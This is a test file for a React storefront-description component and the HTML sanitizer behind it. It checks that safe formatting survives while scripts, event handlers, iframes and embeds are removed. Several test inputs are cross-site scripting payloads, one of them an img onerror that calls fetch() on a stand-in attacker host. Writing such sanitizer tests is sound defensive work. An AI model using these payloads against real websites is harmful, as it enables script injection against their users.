import { describe, it, expect } from "vitest";
import { render, screen } from "@testing-library/react";
import React from "react";
import {
  SafeStorefrontDescription,
  sanitizeStorefrontHtml,
} from "./SafeStorefrontDescription";

describe("SafeStorefrontDescription & sanitizeStorefrontHtml (Issue #1026)", () => {
  describe("sanitizeStorefrontHtml", () => {
    it("preserves safe formatting tags", () => {
      const input = "<p>Welcome to <b>SuperStore</b>! <i>Best quality</i> and <strong>reliable</strong> items.<br></p><ul><li>Item 1</li><li>Item 2</li></ul>";
      const sanitized = sanitizeStorefrontHtml(input);
      expect(sanitized).toBe(input);
    });

    it("strips harmful script tags completely", () => {
      const malicious = '<p>Normal text</p><script>alert("XSS")</script>';
      const sanitized = sanitizeStorefrontHtml(malicious);
      expect(sanitized).not.toContain("<script>");
      expect(sanitized).not.toContain("alert");
      expect(sanitized).toContain("<p>Normal text</p>");
    });

    it("strips inline event handlers like onerror and onload", () => {
      const malicious = '<img src="x" onerror="fetch(\'https://attacker.com\')" /><svg onload="alert(1)"></svg>';
      const sanitized = sanitizeStorefrontHtml(malicious);
      expect(sanitized).not.toContain("onerror");
      expect(sanitized).not.toContain("onload");
      expect(sanitized).not.toContain("<img");
      expect(sanitized).not.toContain("<svg");
    });

    it("strips iframes, objects, and embed elements", () => {
      const malicious = '<iframe src="https://phishing.site"></iframe><object data="evil.swf"></object>';
      const sanitized = sanitizeStorefrontHtml(malicious);
      expect(sanitized).toBe("");
    });

    it("handles null, undefined, or empty strings gracefully", () => {
      expect(sanitizeStorefrontHtml("")).toBe("");
      expect(sanitizeStorefrontHtml(null as unknown as string)).toBe("");
      expect(sanitizeStorefrontHtml(undefined as unknown as string)).toBe("");
    });

    it("respects custom allowedTags when specified", () => {
      const input = "<p>Paragraph</p><b>Bold</b><i>Italic</i>";
      const sanitized = sanitizeStorefrontHtml(input, ["b"]);
      expect(sanitized).toBe("Paragraph<b>Bold</b>Italic");
    });
  });

  describe("SafeStorefrontDescription Component", () => {
    it("renders sanitized HTML within container safely", () => {
      render(
        <SafeStorefrontDescription
          dirtyHtml="<p>Special <b>Promo</b>: 10% off!</p>"
          containerClassName="custom-store-class"
        />
      );

      const container = screen.getByTestId("safe-storefront-description");
      expect(container).toBeInTheDocument();
      expect(container).toHaveClass("custom-store-class");
      expect(container.querySelector("b")).toHaveTextContent("Promo");
    });

    it("renders nothing when input is empty or completely stripped", () => {
      const { container } = render(
        <SafeStorefrontDescription dirtyHtml='<script>eval("evil")</script>' />
      );
      expect(container.firstChild).toBeNull();
    });

    it("renders lists and line breaks properly", () => {
      render(
        <SafeStorefrontDescription
          dirtyHtml="<ul><li>Fast shipping</li><li>Free returns</li></ul>"
        />
      );

      const items = screen.getAllByRole("listitem");
      expect(items).toHaveLength(2);
      expect(items[0]).toHaveTextContent("Fast shipping");
      expect(items[1]).toHaveTextContent("Free returns");
    });
  });
});
